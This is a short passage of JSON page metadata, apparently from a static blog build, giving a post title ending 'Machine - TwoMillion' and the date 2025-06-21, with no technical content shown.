Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"}]},"__N_SSG":true}